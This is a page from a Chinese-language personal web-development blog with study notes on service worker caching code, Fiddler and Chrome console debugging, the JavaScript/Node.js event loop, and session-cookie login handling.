<!doctype html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="/atom.xml" title="My Little World" type="application/atom+xml">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta property="og:type" content="website">
<meta property="og:title" content="My Little World">
<meta property="og:url" content="http://yoohannah.github.io/page/13/index.html">
<meta property="og:site_name" content="My Little World">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="My Little World">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoohannah.github.io/page/13/">





  <title> My Little World </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  










  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">My Little World</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">learn and share</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/cache/serviceworker.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/cache/serviceworker.html" itemprop="url">
                  service worker
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-03T22:52:15+08:00">
                2018-01-03
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>前端与后台代理服务器</p>
<h2 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h2><p>fetch 事件/方法:service worker向后台发起HTTP请求的方法<br>fetch(url).then()</p>
<p>message事件/方法:页面和service worker之间进行通信的方法;同一页面两个窗口之间通信（web worker线程)<br>postMessage发送消息;message接收消息</p>
<p>caches API:处理缓存</p>
<h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><p>注册 register<br>安装 install<br>激活 activation<br>更新 Update<br>service-worker.js文件更新被浏览器发现后，会进入waitting等待状态，当前页面依旧使用旧文件进行work，<br>直到当前页面关闭，旧版本文件的service worker才会被kill掉，新版本文件的service worker开始接管页面的缓存资源<br>新的service worker一开始接管就会触发activate事件，从而可以做一些上次老版本缓存的工作</p>
<p>缓存的文件发生更新，可以在fetch 的时候，一边检查更新从而更新缓存，一边检查缓存然后fetch新资源给浏览器，<br>通过 promise 的 resolve 特性来决定谁快</p>
<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>（https环境）<br>后台消息传递<br>网络代理，转发请求，伪造响应<br>离线缓存<br>消息推送</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">//在项目入口/配置js文件 进行注册</span><br><span class="line">if (navigator.serviceWorker) &#123;</span><br><span class="line">    navigator.serviceWorker.register(&apos;service-worker.js&apos;).then(function(registration) &#123;</span><br><span class="line">        console.log(&apos;service worker 注册成功&apos;);</span><br><span class="line">    &#125;).catch(function (err) &#123;</span><br><span class="line">        console.log(&apos;servcie worker 注册失败&apos;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//service-worker.js 放在项目根目录下,service worker的执行代码</span><br><span class="line">var cacheFiles = [ //指定缓存的文件</span><br><span class="line">    &apos;about.js&apos;,</span><br><span class="line">    &apos;blog.js&apos;</span><br><span class="line">];</span><br><span class="line">self.addEventListener(&apos;install&apos;, function (evt) &#123; //在安装的时候就将指定文件存入cache storage中</span><br><span class="line">    evt.waitUntil(</span><br><span class="line">        caches.open(&apos;my-test-cahce-v1&apos;).then(function (cache) &#123; //使用caches api进行缓存操作</span><br><span class="line">            return cache.addAll(cacheFiles);</span><br><span class="line">        &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br><span class="line">//页面fetch 资源时进行过滤</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function(event) &#123;</span><br><span class="line">  event.respondWith(</span><br><span class="line">    caches.match(event.request) //检查缓存是否有资源</span><br><span class="line">      .then(function(response) &#123;</span><br><span class="line">        if (response) &#123; //如果有直接返回</span><br><span class="line">          return response;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 因为 event.request 流已经在 caches.match 中使用过一次，</span><br><span class="line">        // 那么该流是不能再次使用的。我们只能得到它的副本，拿去使用。</span><br><span class="line">        var fetchRequest = event.request.clone();</span><br><span class="line"></span><br><span class="line">        // fetch 的通过信方式，得到 Request 对象，然后发送请求</span><br><span class="line">        return fetch(fetchRequest).then(</span><br><span class="line">          function(response) &#123;</span><br><span class="line">            // 检查是否成功</span><br><span class="line">            if(!response || response.status !== 200 || response.type !== &apos;basic&apos;) &#123;</span><br><span class="line">              return response;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 如果成功，该 response 一是要拿给浏览器渲染，而是要进行缓存。</span><br><span class="line">            // 由于 caches.put 使用的是文件的响应流，一旦使用，</span><br><span class="line">            // 那么返回的 response 就无法访问造成失败，所以，这里需要复制一份。</span><br><span class="line">            var responseToCache = response.clone();</span><br><span class="line"></span><br><span class="line">            caches.open(CACHE_NAME)</span><br><span class="line">              .then(function(cache) &#123;</span><br><span class="line">                cache.put(event.request, responseToCache);</span><br><span class="line">              &#125;);</span><br><span class="line"></span><br><span class="line">            return response;</span><br><span class="line">          &#125;</span><br><span class="line">        );</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//service-worker.js文件更新删除之前版本文件缓存的资源</span><br><span class="line"></span><br><span class="line">self.addEventListener(&apos;activate&apos;, function(event) &#123;</span><br><span class="line"></span><br><span class="line">  var cacheWhitelist = [&apos;v1&apos;];</span><br><span class="line"></span><br><span class="line">  event.waitUntil(</span><br><span class="line">  // 遍历 caches 里所有缓存的 keys 值</span><br><span class="line">    caches.keys().then(function(cacheNames) &#123;</span><br><span class="line">      return Promise.all(</span><br><span class="line">        cacheNames.map(function(cacheName) &#123;</span><br><span class="line">          if (cacheWhitelist.includes(cacheName)) &#123;</span><br><span class="line">          // 删除 v1 版本缓存的文件</span><br><span class="line">            return caches.delete(cacheName);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><a href="https://segmentfault.com/a/1190000008050742" target="_blank" rel="noopener">相关文档</a><br><a href="https://www.villainhr.com/page/2016/09/25/%E5%89%8D%E7%AB%AF%20fetch%20%E9%80%9A%E4%BF%A1" target="_blank" rel="noopener">fetch 通信</a><br><a href="https://www.villainhr.com/page/2016/08/22/Web%20Worker" target="_blank" rel="noopener">web worker 语法</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">Service Worker API</a></p>
<p>遗留问题：fetch通信headers添加token字段,不生效</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/test/fiddler.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/test/fiddler.html" itemprop="url">
                  调试
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-03T22:47:15+08:00">
                2018-01-03
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="fiddler-使用"><a href="#fiddler-使用" class="headerlink" title="fiddler 使用"></a>fiddler 使用</h1><p>浏览器向服务器发送请求的拦截器</p>
<h2 id="statistic"><a href="#statistic" class="headerlink" title="statistic"></a>statistic</h2><p>查看一次请求各阶段所发生的时间，HTTP performance<br><img src="/image/fiddler5.png" alt="fiddler5"></p>
<h1 id="Inspectors"><a href="#Inspectors" class="headerlink" title="Inspectors"></a>Inspectors</h1><p>查看报文，上半部分是request,下半部分是response<br><img src="/image/fiddler4.png" alt="fiddler4"></p>
<h2 id="AutoResponder"><a href="#AutoResponder" class="headerlink" title="AutoResponder"></a>AutoResponder</h2><p>拦截本来要发给真正服务器的指定请求,将本地资源作为response返回去<br><img src="/image/fiddler3.png" alt="fiddler3"><br>1.开启规则<br>2.添加规则<br>3.指定请求，若以EXACT：开头，要写完整的请求路径;模糊匹配的话就不要写EXACT：<br>4.指定作为response的本地路径资源地址<br>5.确认规则配置完毕</p>
<h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>自己创建request 向服务器发送请求<br><img src="/image/fiddler2.png" alt="fiddler2"><br>配置好request后，点击excute按钮手动向服务器发送请求</p>
<h2 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h2><p>只拦截指定的请求,其他请求不拦截，指定多个时用逗号隔开<br><img src="/image/fiddler1.png" alt="fiddler1"><br>填写指定请求时，编辑框为黄色，为未保存状态，点击右上角‘Changes not yet saved’确认配置完毕</p>
<h1 id="谷歌浏览器调试常用"><a href="#谷歌浏览器调试常用" class="headerlink" title="谷歌浏览器调试常用"></a>谷歌浏览器调试常用</h1><h2 id="将respose进行json格式转换"><a href="#将respose进行json格式转换" class="headerlink" title="将respose进行json格式转换"></a>将respose进行json格式转换</h2><p>1.右键接口选择copy-&gt;copy response;<br>2.在console界面执行copy()函数<br>copy(   ctrl+v    )   回车<br>3.打开编辑器，新建一个文件，ctrl+v,就得到response 的json格式<br><img src="/image/debug1.gif" alt="debug1"></p>
<h2 id="console使用"><a href="#console使用" class="headerlink" title="console使用"></a>console使用</h2><ol>
<li><p>console.table(obj):将json数据以表格形式展示在控制台<br>例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var animals = [</span><br><span class="line">    &#123; animal: &apos;Horse&apos;, name: &apos;Henry&apos;, age: 43 &#125;,</span><br><span class="line">    &#123; animal: &apos;Dog&apos;, name: &apos;Fred&apos;, age: 13 &#125;,</span><br><span class="line">    &#123; animal: &apos;Cat&apos;, name: &apos;Frodo&apos;, age: 18 &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">console.table(animals);</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 console.time() 和 console.timeEnd() 对循环做基准测试<br>例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">console.time(&apos;Timer1&apos;);</span><br><span class="line"></span><br><span class="line">var items = [];</span><br><span class="line"></span><br><span class="line">for(var i = 0; i &lt; 100000; i++)&#123;</span><br><span class="line">   items.push(&#123;index: i&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.timeEnd(&apos;Timer1&apos;);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>最后会得到循环所用时间<br>Timer1：xxxxx ms</p>
<ol start="3">
<li>使用console.trace 跟踪调用栈<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">var car;</span><br><span class="line">var func1 = function() &#123;</span><br><span class="line">	func2();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var func2 = function() &#123;</span><br><span class="line">	func4();</span><br><span class="line">&#125;</span><br><span class="line">var func3 = function() &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var func4 = function() &#123;</span><br><span class="line">	car = new Car();</span><br><span class="line">	car.funcX();</span><br><span class="line">&#125;</span><br><span class="line">var Car = function() &#123;</span><br><span class="line">	this.brand = &apos;volvo&apos;;</span><br><span class="line">	this.color = &apos;red&apos;;</span><br><span class="line">	this.funcX = function() &#123;</span><br><span class="line">		this.funcY();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	this.funcY = function() &#123;</span><br><span class="line">		this.funcZ();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	this.funcZ = function() &#123;</span><br><span class="line">		console.trace(&apos;trace car&apos;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">func1();</span><br><span class="line">结果如下：</span><br><span class="line">trace car</span><br><span class="line">Car.funcZ @ VM524:28</span><br><span class="line">Car.funcY @ VM524:24</span><br><span class="line">Car.funcX @ VM524:20</span><br><span class="line">func4 @ VM524:14</span><br><span class="line">func2 @ VM524:7</span><br><span class="line">func1 @ VM524:3</span><br><span class="line">(anonymous) @ VM524:31</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="调试js"><a href="#调试js" class="headerlink" title="调试js"></a>调试js</h2><p>在当前页面的js里面修改或添加代码后，ctrl+s 然后在页面触发更改的代码，即可进行调试<br>但要注意需要刷新才能执行到的代码，不能用这种方式进行调试</p>
<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><p>直接在代码序号上进行点击即添加了断点<br>取消断点就再点击断点<br>退出断点调试就点右上角<br><img src="/image/debug2.png" alt="debug2"><br>禁用断点<br><img src="/image/debug3.png" alt="debug3"><br>如果想知道当前断点上的变量值，只需要将鼠标放在变量上即可<br><a href="https://www.zybuluo.com/lxjwlt/note/434612" target="_blank" rel="noopener">相关链接</a><br><a href="http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html" target="_blank" rel="noopener">相关链接</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/js/eventloop.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/js/eventloop.html" itemprop="url">
                  关于事件循环event-loop
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-01T21:47:15+08:00">
                2018-01-01
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="js单线程"><a href="#js单线程" class="headerlink" title="js单线程"></a>js单线程</h1><p>同一时间只干一件事，干完一件事再干下一件事，<br>如果前一个任务耗时很长，后一个任务也得一直等着</p>
<p>为什么这样设计？<br>js 要指挥浏览器干活，如果有两个线程同时执行任务，一个删除DOM，一个修改该DOM，浏览器会不知道以哪个线程为准</p>
<h1 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h1><p>同步任务，在主线程上排队执行的任务，前一个执行完才能执行后一个任务<br>异步任务，一开始不进入主线程，而进入‘任务队列’被挂起，只有‘任务队列’通知主线程某个异步任务可以执行了，该任务才会进入主线程<br>或者主线程上没有要执行的任务了，就会去任务队列拿任务 ，在确认该到达规定时间后，就给到主线程进行执行其对应的回调函数</p>
<h1 id="event-Loop"><a href="#event-Loop" class="headerlink" title="event Loop"></a>event Loop</h1><p>主线程从”任务队列”中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）<br>setTimeout(fn,0)的含义是，指定某个任务在主线程最早可得的空闲时间执行，即尽可能早得执行<br>另外如果主线程的栈中当前代码耗时很长，要等很久，按照先主线程，再任务队列的执行顺序，<br>就没办法保证setTimeout的回调函数fn能够在指定的时间执行</p>
<h1 id="node-js-event-loop"><a href="#node-js-event-loop" class="headerlink" title="node.js event loop"></a>node.js event loop</h1><p>nodejs 运行机制：<br> (1）V8引擎解析JavaScript脚本。<br>（2）解析后的代码，调用Node API。<br>（3）libuv库负责Node API的执行。它将不同的任务分配给不同的线程，形成一个Event Loop（事件循环），以异步的方式将任务的执行结果返回给V8引擎。<br>（4）V8引擎再将结果返回给用户。</p>
<p>与任务队列相关方法<br>process.nextTick:在主线程任务全部结束后，读取任务队列的任务之前执行它所指定的函数，<br>如果指定函数里还套嵌process.nextTick方法，或者有多个process.nextTick方法，都要在本轮读取任务队列前执行完<br>setImmediate：它指定的任务总是在下一次的eventloop时执行，<br>如果setImmediate与setTimeout(fn,0)各自添加了一个回调函数，那么在下一loop时，他们回调函数的顺序是不确定<br>如果setImmediate套嵌setImmediate方法,则套嵌的回调函数会被注册到下一轮事件循环中再执行</p>
<p>即多个process.nextTick语句总是在当前”执行栈”一次执行完，多个setImmediate可能则需要多次loop才能执行完。</p>
<p><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">相关链接</a></p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>task/macrotask:script（整体代码）, setTimeout, setInterval, setImmediate, I/O, UI rendering<br>setTimeout() 设置的异步延迟事件；<br>DOM 操作相关如布局和绘制事件；<br>网络 I/O 如 AJAX 请求事件；<br>用户操作事件，如鼠标点击、键盘敲击。<br>micotask:process.nextTick, Promises（这里指浏览器实现的原生 Promise）, Object.observe, MutationObserver<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">process.nextTick(() =&gt; &#123;</span><br><span class="line">  console.log(&apos;nextTick&apos;)</span><br><span class="line">&#125;)</span><br><span class="line">Promise.resolve()</span><br><span class="line">  .then(() =&gt; &#123;</span><br><span class="line">    console.log(&apos;then&apos;)</span><br><span class="line">  &#125;)</span><br><span class="line">setImmediate(() =&gt; &#123;</span><br><span class="line">  console.log(&apos;setImmediate&apos;)</span><br><span class="line">&#125;)</span><br><span class="line">console.log(&apos;end&apos;)</span><br><span class="line"></span><br><span class="line">//结果</span><br><span class="line">end</span><br><span class="line">nextTick</span><br><span class="line">then</span><br><span class="line">setImmediate</span><br></pre></td></tr></table></figure></p>
<p>micro-task在ES2015规范中称为Job,<br>promise.then的执行其实是向PromiseJobs添加Job</p>
<p>在eventloop中，一个task执行完会检查micotask队列，如果有，则先执行micotask，然后再去异步队列领取任务<br><a href="https://github.com/creeperyang/blog/issues/21" target="_blank" rel="noopener">相关</a><br><a href="https://segmentfault.com/a/1190000010913949" target="_blank" rel="noopener">相关</a><br><a href="https://www.cnblogs.com/dong-xu/p/7000139.html" target="_blank" rel="noopener">相关</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoohannah.github.io/post/performance/cache/session&cookie.html">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="YooHannah">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/psb.jpg">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="My Little World">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="My Little World" src>
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/post/performance/cache/session&cookie.html" itemprop="url">
                  session 和cookie
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-28T08:17:15+08:00">
                2017-12-28
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="正常情况下身份识别"><a href="#正常情况下身份识别" class="headerlink" title="正常情况下身份识别"></a>正常情况下身份识别</h1><p>用户提交登录信息，服务器拿到登录信息进行验证之后，<br>为该用户在session表中建立唯一sessionid,然后在返回响应的时候，将sessionid放在set-cookie中告诉浏览器，将sessionid 放在cookie表中，下次请求的时候放在cookie中再发给我<br>这样用户在已登录的状态下进行的访问请求,浏览器都会在报文中将sessionid放在cookie中给回服务器<br>服务器拿到cookie 就能判断用户是否进行了登录，并根据session表确定登录身份</p>
<h1 id="session-机制"><a href="#session-机制" class="headerlink" title="session 机制"></a>session 机制</h1><p>当用户访问服务器时,服务器就会先检查请求有没有带sessionid,<br>如果没带的话,就为该用户在session列表中建立一个session，<br>(这个session是存储特定用户会话所需的属性及配置信息的一个对象，开发人员可以控制里面是什么内容，可以自定义的)<br>并生成唯一sessionid通过set-cookie给回用户<br>如果有带的话,就根据sessionid 在列表中查找对应的session,将session 取出来使用，如果没找到则可能新建一个</p>
<p>1.浏览器禁用cookie解决办法<br>让浏览器重写url：将sessionid 以参数或者附加信息方式放在url后面传递给服务器<br>表单隐藏字段：服务器在返回表单的时候就将sessionid 以隐藏字段方式给过去,客户端提交表单的时候就一并传回来</p>
<p>2.session什么时候被删除<br>过期就会自动删除<br>执行特定删除命令的时候，比如注销<br>session存在内存中的时候，当服务器被重启或者停止时，session列表会被清空</p>
<p>3.session存储<br>一般存在内存中，但服务器重启或者停止会被清空<br>如果想持久保存，可以放在硬盘里面，这样服务器重启或者停止不会被清空</p>
